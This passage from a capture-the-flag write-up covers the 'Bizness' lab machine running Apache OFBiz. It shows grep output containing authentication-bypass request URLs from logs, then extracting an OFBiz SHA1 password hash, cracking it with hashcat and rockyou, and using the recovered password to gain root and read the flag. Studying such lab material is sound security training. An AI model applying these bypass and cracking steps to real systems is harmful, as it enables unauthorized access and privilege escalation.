./ofbiz/seg0/dump.txt:40378:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:40911:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:41067:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:41137:control/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:41278:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:41553:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:41675:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:41769:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:42165:3https://bizness.htb/webtools/control/password
./ofbiz/seg0/dump.txt:42213:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:42570:control/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:42608:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:42609:webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y
python-requests
./ofbiz/seg0/dump.txt:42779:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:42802:htb/webtools/control/ping?USERNAME=&PASSWORD=qualsytest&requirePasswordChange=Y@FDMozilla
./ofbiz/seg0/dump.txt:42812:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y@HFMozilla/5
./ofbiz/seg0/dump.txt:43174:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=a&requirePasswordChange=Y@usMozilla
./ofbiz/seg0/dump.txt:43229:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:43858:bizness.htb/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:44310:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:44556:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:45079:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:45210:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:45873:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:47606:4https://bizness.htb/webtools/control/password
./ofbiz/seg0/dump.txt:47607:3https://bizness.htb/webtools/control/password
./ofbiz/seg0/dump.txt:47623:htb/webtools/control/ping?USERNAME=&PASSWORD=test&requirePasswordChange=Y@FDMozilla
./ofbiz/seg0/dump.txt:48655:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:48726:password
./ofbiz/seg0/dump.txt:48767:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:49614:password
                                    gobuster/3.6
                                                        127.0
./ofbiz/seg0/dump.txt:49974:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:52092:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:53103:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:53130:bizness.htb/webtools/control/account-password
                                                                         gobuster/3.6
                                                                                        127.0
./ofbiz/seg0/dump.txt:53693:password
                                    gobuster/3.6
                                                        127.0
./ofbiz/seg0/dump.txt:53733:5https://bizness.htb/webtools/control/password-recover
                                                                                  gobuster/3.6
                                                                                                127
./ofbiz/seg0/dump.txt:53734:1https://bizness.htb/webtools/control/password
./ofbiz/seg0/dump.txt:53825:password
                                    gobuster/3.6
                                                        127.0
./ofbiz/seg0/dump.txt:55643:htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:57283:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/seg0/dump.txt:58324:password
                                    gobuster/3.6
                                                        127.0
./ofbiz/seg0/dump.txt:59193:password
./ofbiz/seg0/dump.txt:69159:PASSWORD
./ofbiz/seg0/dump.txt:78074:PASSWORD?VARCHAR
./ofbiz/seg0/dump.txt:80977:PASSWORD?VARCHAR
./ofbiz/seg0/dump.txt:83515:PASSWORD?VARCHAR
./ofbiz/seg0/dump.txt:83539:PASSWORD?VARCHAR
./ofbiz/seg0/dump.txt:83568:PASSWORD    ?VARCHAR
./ofbiz/seg0/dump.txt:85393:PASSWORDCHAR
./ofbiz/seg0/dump.txt:85394:PASSWORD?VARCHAR
./ofbiz/seg0/dump.txt:86824:PASSWORD?VARCHAR
./ofbiz/seg0/dump.txt:86863:PASSWOR?VARCHAR
./ofbiz/seg0/dump.txt:86888:PASSWORD?VARCHAR
./ofbiz/seg0/dump.txt:88155:PASSWORD?VARCHAR
PASSWORDseg0/dump.txt:88156:9f311549-018c-71c6-2b97-ffffa94ec81a
./ofbiz/seg0/dump.txt:88161:PASSWORD
PASSWORDseg0/dump.txt:88183:1f22554f-018c-71c6-2b97-ffffa94ec81a
./ofbiz/seg0/dump.txt:88198:PASSWORD?VARCHAR
./ofbiz/seg0/dump.txt:90031:PASSWORD%&$9810800c-0134-14a5-40c1-000004f61f90
./ofbiz/seg0/dump.txt:90185:PASSWORD
./ofbiz/seg0/dump.txt:90494:PASSWORD
./ofbiz/seg0/dump.txt:90517:PASSWORD
./ofbiz/seg0/dump.txt:90803:PASSWORD
PASSWORDseg0/dump.txt:90803:9f311549-018c-71c6-2b97-ffffa94ec81a
./ofbiz/seg0/dump.txt:90804:PASSWORD
./ofbiz/seg0/dump.txt:90909:PASSWORD
./ofbiz/seg0/dump.txt:91120:PASSWORD
./ofbiz/seg0/dump.txt:91130:PASSWORD
./ofbiz/seg0/dump.txt:91215:PASSWORD
./ofbiz/seg0/dump.txt:91339:PASSWORD
./ofbiz/seg0/dump.txt:91448:PASSWORD
./ofbiz/seg0/dump.txt:91473:PASSWORDH&&$363a08d1-018c-71c6-2b97
PASSWORDseg0/dump.txt:91528:1f22554f-018c-71c6-2b97-ffffa94ec81a
./ofbiz/seg0/c54d0.dat:21:Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled
./ofbiz/seg0/c54d0.dat:21:Password
./ofbiz/seg0/ca1.dat:32:PASSWORD%&$9810800c-0134-14a5-40c1-000004f61f90
./ofbiz/seg0/ca1.dat:186:PASSWORD
./ofbiz/seg0/ca1.dat:495:PASSWORD
./ofbiz/seg0/ca1.dat:518:PASSWORD
./ofbiz/seg0/ca1.dat:804:PASSWORD
PASSWORDseg0/ca1.dat:804:9f311549-018c-71c6-2b97-ffffa94ec81a
./ofbiz/seg0/ca1.dat:805:PASSWORD
./ofbiz/seg0/ca1.dat:910:PASSWORD
./ofbiz/seg0/ca1.dat:1121:PASSWORD
./ofbiz/seg0/ca1.dat:1131:PASSWORD
./ofbiz/seg0/ca1.dat:1216:PASSWORD
./ofbiz/seg0/ca1.dat:1340:PASSWORD
./ofbiz/seg0/ca1.dat:1449:PASSWORD
./ofbiz/seg0/ca1.dat:1474:PASSWORDH&&$363a08d1-018c-71c6-2b97
PASSWORDseg0/ca1.dat:1529:1f22554f-018c-71c6-2b97-ffffa94ec81a
./ofbiz/seg0/c6021.dat:3:user   generalmail.smtp.auth.password  generalmail.smtp.port   general
./ofbiz/seg0/c60.dat:122:PASSWORD
./ofbiz/seg0/c5f90.dat:4:PASSWORD
./ofbiz/seg0/c5f90.dat:5:Password
./ofbiz/seg0/c191.dat:19:PASSWORD'&$c013800d-00fb-2649-07ec
./ofbiz/seg0/c191.dat:19:PASSWOR(&$c013800d-00fb-2649-07ec
./ofbiz/seg0/c90.dat:206:PASSWORD?VARCHAR
./ofbiz/seg0/c90.dat:3109:PASSWORD?VARCHAR
./ofbiz/seg0/c90.dat:5647:PASSWORD?VARCHAR
./ofbiz/seg0/c90.dat:5671:PASSWORD?VARCHAR
./ofbiz/seg0/c90.dat:5700:PASSWORD      ?VARCHAR
./ofbiz/seg0/c90.dat:7525:PASSWORDCHAR
./ofbiz/seg0/c90.dat:7526:PASSWORD?VARCHAR
./ofbiz/seg0/c90.dat:8956:PASSWORD?VARCHAR
./ofbiz/seg0/c90.dat:8995:PASSWOR?VARCHAR
./ofbiz/seg0/c90.dat:9020:PASSWORD?VARCHAR
./ofbiz/seg0/c90.dat:10287:PASSWORD?VARCHAR
PASSWORDseg0/c90.dat:10288:9f311549-018c-71c6-2b97-ffffa94ec81a
./ofbiz/seg0/c90.dat:10293:PASSWORD
PASSWORDseg0/c90.dat:10315:1f22554f-018c-71c6-2b97-ffffa94ec81a
./ofbiz/seg0/c90.dat:10330:PASSWORD?VARCHAR
./ofbiz/seg0/c71.dat:149:PASSWORD
./ofbiz/seg0/c1930.dat:80:td align='left'><span>Password: </span></td
./ofbiz/seg0/c1930.dat:83:td align='left'><input type="password" class='inputBox' name="PASSWORD" autocomplete
./ofbiz/seg0/c1930.dat:98:href="<@ofbizUrl>/forgotpasswd</@ofbizUrl>">Forgot Password?</a></div
./ofbiz/seg0/c1930.dat:114:if autoUserLogin?has_content>document.loginform.PASSWORD.focus();</#if
./ofbiz/seg0/c1930.dat:360:Password>${password}</Password
./ofbiz/seg0/c57b0.dat:63:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                127.0.1
./ofbiz/seg0/c57b0.dat:63:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                127.0.1
./ofbiz/seg0/c57b0.dat:63:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                127.0.1
./ofbiz/seg0/c57b0.dat:63:htb/webtools/control/ping?USERNAME=&PASSWORD=qualsytest&requirePasswordChange=Y
                                                                                                                127.0
./ofbiz/seg0/c57b0.dat:66:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                127.0.1
./ofbiz/seg0/c57b0.dat:67:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=a&requirePasswordChange=Y
                                                                                                                127.0
./ofbiz/seg0/c57b0.dat:69:htb/webtools/control/ping?USERNAME=&PASSWORD=test&requirePasswordChange=Y
                                                                                                        127.0
./ofbiz/seg0/c57b0.dat:70:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                127.0.1
./ofbiz/seg0/c57b0.dat:73:htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y
                                                                                                        127.0
./ofbiz/seg0/c57b0.dat:74:htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y
                                                                                                        127.0
./ofbiz/seg0/c1c70.dat:7:VT_CHPWD_TMPLT_LOC
VT_RES_TYPE22#!Change Password Template Location
./ofbiz/seg0/c1c70.dat:7:VT_FGPWD_TMPLT_LOC
VT_RES_TYPE23#!Forget Password Template Location
./ofbiz/seg0/c1c70.dat:96:PRDS_EMAIL
                                    PWD_RETRIEVE10Retrieve Password
./ofbiz/log/log61.dat:351:htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y
python-requests
./ofbiz/log/log61.dat:351:htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y
                                                                                                        127.0
./ofbiz/log/log61.dat:354:htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y  HFMozilla
./ofbiz/log/log61.dat:354:htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y
                                                                                                        127.0
./ofbiz/log/log61.dat:391:bizness.htb/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/log/log61.dat:404:htb/webtools/control/ping?USERNAME&PASSWORD=admin&requirePasswordChange=Y
                                                                                                        127.0
./ofbiz/log/log61.dat:408:htb/webtools/control/ping?USERNAME&PASSWORD=admin&requirePasswordChange=N
                                                                                                        127.0
./ofbiz/log/log61.dat:408:htb/webtools/control/ping?USERNAME&PASSWORD=admin&requirePasswordChange=N
                                                                                                        127.0
./ofbiz/log/log61.dat:409:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/log/log61.dat:409:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                                127.0.1
./ofbiz/log/log61.dat:414:htb/webtools/control/ping?USERNAME&PASSWORD=admin&requirePasswordChange=N
                                                                                                        127.0
./ofbiz/log/log61.dat:415:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/log/log61.dat:415:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                                127.0.1
./ofbiz/log/log61.dat:420:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/log/log61.dat:420:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                                127.0.1
./ofbiz/log/log61.dat:428:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/log/log61.dat:429:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                                127.0.1
./ofbiz/log/log61.dat:432:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/log/log61.dat:432:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                                127.0.1
./ofbiz/log/log61.dat:433:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/log/log61.dat:435:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                                127.0.1
./ofbiz/log/log61.dat:436:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/log/log61.dat:436:htb/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                                127.0.1
./ofbiz/log/log61.dat:439:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
python-requests/2
./ofbiz/log/log61.dat:439:htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y
                                                                                                        127.0.1
./ofbizolap/seg0/c180.dat:87:SYSCS_CREATE_USEuserNampasswordVARCHAR
./ofbizolap/seg0/c180.dat:87:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
./ofbizolap/seg0/c180.dat:87:SYSCS_RESET_PASSWORuserNampasswordVARCHAR
./ofbizolap/seg0/c180.dat:87:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
./ofbizolap/seg0/c180.dat:87:SYSCS_MODIFY_PASSWORpasswordVARCHAR
./ofbizolap/seg0/ca1.dat:42:PASSWORD%&$9810800c-0134-14a5-40c1-000004f61f90
./ofbizolap/seg0/c191.dat:19:PASSWORD'&$c013800d-00fb-2649-07ec
./ofbizolap/seg0/c191.dat:19:PASSWOR(&$c013800d-00fb-2649-07ec
./ofbizolap/seg0/c90.dat:207:PASSWORD?VARCHAR
./ofbiztenant/seg0/c180.dat:87:SYSCS_CREATE_USEuserNampasswordVARCHAR
./ofbiztenant/seg0/c180.dat:87:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
./ofbiztenant/seg0/c180.dat:87:SYSCS_RESET_PASSWORuserNampasswordVARCHAR
./ofbiztenant/seg0/c180.dat:87:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
./ofbiztenant/seg0/c180.dat:87:SYSCS_MODIFY_PASSWORpasswordVARCHAR
./ofbiztenant/seg0/ca1.dat:10:PASSWORD)@c&$31d4c223-018c-71c6-2b97
./ofbiztenant/seg0/ca1.dat:48:PASSWORD%&$9810800c-0134-14a5-40c1-000004f61f90
./ofbiztenant/seg0/c191.dat:19:PASSWORD'&$c013800d-00fb-2649-07ec
./ofbiztenant/seg0/c191.dat:19:PASSWOR(&$c013800d-00fb-2649-07ec
./ofbiztenant/seg0/c90.dat:206:PASSWORD?VARCHAR
./ofbiztenant/seg0/c90.dat:243:PASSWORD?VARCHAR
./ofbiztenant/log/log1.dat:182:PASSWORD  ?VARCHAR
./ofbiztenant/log/log1.dat:182:PASSWORD )a(Jr
```

Among the strings we'll find our hash:

```shell
...
./ofbiz/seg0/dump.txt:91473:PASSWORDH&&$363a08d1-018c-71c6-2b97
PASSWORDseg0/dump.txt:91528:1f22554f-018c-71c6-2b97-ffffa94ec81a
./ofbiz/seg0/c54d0.dat:21:Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled
./ofbiz/seg0/c54d0.dat:21:Password
./ofbiz/seg0/ca1.dat:32:PASSWORD%&$9810800c-0134-14a5-40c1-000004f61f90
...
```

Let's take a look at the ofbiz implementation of password hashing in the [HashCrypt.java](https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java) file. The hash uses Base64 Safe URL encoding.

Using CyberChef, we decode `$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`:

    From Base64 (URL Safe alphabet).
    To HEX (no delimiters).



We need SHA1 mode and salt (in our case salt `d` - `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`), this will be mode `120` of the [hashcat examples](https://hashcat.net/wiki/doku.php?id=example_hashes).

The file `hash.txt`:

```shell
hash:salt
```

```shell
b8fd3f41a541a435857a8f3e751cc3a91c174362:d
```

Bruteforce:

```shell
$ hashcat -a 0 -m 120 -O hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-skylake-avx512-Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz, 1432/2928 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 120 (sha1($salt.$pass))
Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   974.3 kH/s (0.31ms) @ Accel:256 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1478700/14344385 (10.31%)
Rejected.........: 44/1478700 (0.00%)
Restore.Point....: 1478188/14344385 (10.30%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: monkies1103 -> monkbretton
Hardware.Mon.#1..: Temp:178c Util: 72%
```

With the resulting password `monkeybizness`, log in as root:

```shell
ofbiz@bizness:/opt/ofbiz/runtime/data/derby$ su
su
Password: monkeybizness
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/opt/ofbiz/runtime/data/derby
cd /root
ls
root.txt
cat root.txt
5da8583949646f5a2499b0184fef7089
```